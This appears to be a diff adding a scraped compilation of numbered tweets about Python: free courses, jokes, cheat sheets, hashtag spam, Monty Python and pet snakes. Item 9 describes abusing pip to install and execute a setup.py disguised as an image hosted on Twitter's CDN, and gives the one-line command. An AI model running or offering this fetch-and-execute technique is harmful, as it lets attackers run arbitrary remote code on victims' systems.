@@ -1,0 +1,132 @@
+1-Learning Python and SQL is one of the best ways to land a job in Data Science. 
+
+Here's how to do it for free in 4 simple steps:
+***********
+2-Become a Google Certified Data Scientist by spending $0 
+
+Free Certification Courses in Data Science using Python from Google. 
+
+A Thread 
+***********
+3-Google Sponsored Python Courses for FREE
+
+Many friends are asking me where to find beginner-friendly Python Courses for FREE. 
+
+Here are 3 courses from Learn With Google. All these Courses are Free
+
+A Thread 
+***********
+4-Google Sponsored Python Courses for FREE
+
+A Thread 
+***********
+5-My PhD professors taught me MATLAB during my master's degree.
+
+So I watched 200 YouTube videos to learn Python
+
+96% of them were a complete waste of time.
+
+But these 8 taught me more than all my PhD professors combined:
+***********
+6-Remove Image Background using Python https://youtu.be/RkdFkhfMK2k
+***********
+7-#Python Pop Quiz 
+
+What is the contents of my_list?
+
+A) [4, 5, 6]
+B) [4, 5, 6, 7]
+C) None
+***********
+8-how men who do coding interviews in Python like to be kissed
+***********
+9-TIL python's pip will execute a setup .py directly from a ZIP archive from a web URL, with mime sniffing.
+
+This allows for a nice lolbin oneliner, with payload hosted on Twitter's CDN (or anywhere else really)
+
+pip install "https://pbs"."twimg"."com/media/Ff0iwcvXEAAQDZ3.png"
+***********
+10-“Alright, we’ll call it a draw.”
+
+MONTY PYTHON AND THE HOLY GRAIL (1975)
+
+#JohnCleese #GrahamChapman
+***********
+11-Become a Google Certified Data Analyst 
+
+A Thread 
+***********
+12-#Python Devs trying to learn #Javascript
+***********
+13-If you are looking for someone who knows:
+
+HTML, CSS, JavaScript, Python, NodeJS, GIT, GitHub, GraphQL, React, AWS, Docker, Jenkins, Bash scripting,  Terraform, Kubernetes, MSQL, MySQL, DynamoDB, MongoDB
+
+What you are looking for is an entire IT department, not a developer!
+***********
+14-I wrote a Python script that scans 
+@GeoConfirmed
+’s last 100 mentions and tweets for geolocation coordinates and outputs them to a KML file that can be imported into Google Earth Pro.   (1/9)
+Link: https://github.com/davidandrewnew/gc_assist…
+***********
+15-Great googly moogly. We've released a new version of Textual! The TUI library for #Python 
+
+This version has all the stuff I've been banging on about for months. CSS, devtools, live editing, data-tables, and more...
+
+Here's the announcement:
+
+https://textualize.io/blog/posts/textual-0-point-2-point-0…
+***********
+16-Visualization of all time #EPL stats. This was done by using python to scrape the #PL website, the code is in frame 2. Visualization done using Microsoft Power BI. 
+
+Comments are well welcome.
+***********
+17-1. Introduction to Python Programming
+***********
+18-Machine Learning Algorithms
+
+#BigData #Analytics #DataScience #AI #MachineLearning #IoT #PyTorch #Python #RStats #TensorFlow #Java #JavaScript #ReactJS #React #Serverless #DataScientist #Linux #Programming #Coding #100DaysofCode #DevOps #GitHub #SQL #Dev #CyberSecurity #Developer
+***********
+19-データ活用プロジェクトを立ち上げ、社内にきっちり定着化させるための最初の一歩です！ Python実践機械学習システム100本ノック 
+#駆け出しエンジニアと繋がりたい #プログラミング初心者 #Python #Progate
+***********
+20-You sleep with the python, you might get eaten by it someday
+***********
+21-Data Science Process 
+
+#BigData #Analytics #DataScience #AI #MachineLearning #IoT #PyTorch #Python #RStats #TensorFlow #Java #JavaScript #ReactJS #React #Serverless #DataScientist #Linux #Programming #Coding #100DaysofCode #DevOps #GitHub #SQL #Dev #CyberSecurity #Developer
+***********
+22-Celia the Banana morph ball python
+***********
+23-Compact #Javascript Cheat-Sheet  
+
+#Fintech #NFT #web3 #Metaverse #Tech #AI #DataScience #BigData #Analytics #innovation #digital #Python #IoTeX #WomenInSTEM #MachineLearning #TensorFlow #Cloud #coding #ArtificialIntelligence #100DaysOfCode #Blockchain #Infographic
+***********
+24-2. Programming for Everybody (Getting Started with Python)
+***********
+25-With how I'm using Python it's more just a glorified calculator with turing completeness bolted on.
+
+Me: Opens Python
+Me: what's 32*32
+Python: 1024
+Me: thx *closes python*
+***********
+26-A Pokot warrior heri akule python instead one of is over 2000 goats.
+***********
+27-今までPythonのコードを書くにあたって取り敢えずおまじないと思っていた（思うようにしていた）
+if __name__ == "__main__":　がようやく少し分かった気がする　笑
+
+#駆け出しエンジニアと繋がりたい
+***********
+28-「小文字」合格できました！
+悔しいなあ。ずっと return の箇所を print で書いていた。 https://recursionist.io/dashboard/problems/submissions/423374… #RecursionCS #コンピューターサイエンス #プログラミング #独学 #python
+***********
+29- Another great SQL Cheat Sheet 
+#BigData #Analytics #DataScience #AI #MachineLearning #IoT #PyTorch #Python #RStats #TensorFlow #Java #JavaScript #KiranParmar  #CloudComputing #Serverless #DataScientist #Linux #Coding #100DaysofCode #DevOps #GitHub #SQL #Dev #Tech #Cloud
+***********
+30-There is something Monty Python level absurd at BBC vox pop reports around Yorkshire towns that present as the voice of the British people the pensioners you meet at the pub at 2pm on a Wednesday while everyone else is at work
+***********
+31-Top Python Libraries 
+
+#BigData #Analytics #DataScience #AI #MachineLearning #IoT #PyTorch #Python #RStats #TensorFlow #Java #JavaScript #ReactJS #React #Serverless #DataScientist #Linux #Programming #Coding #100DaysofCode #DevOps #GitHub #SQL #Dev #CyberSecurity #Developer
+***********
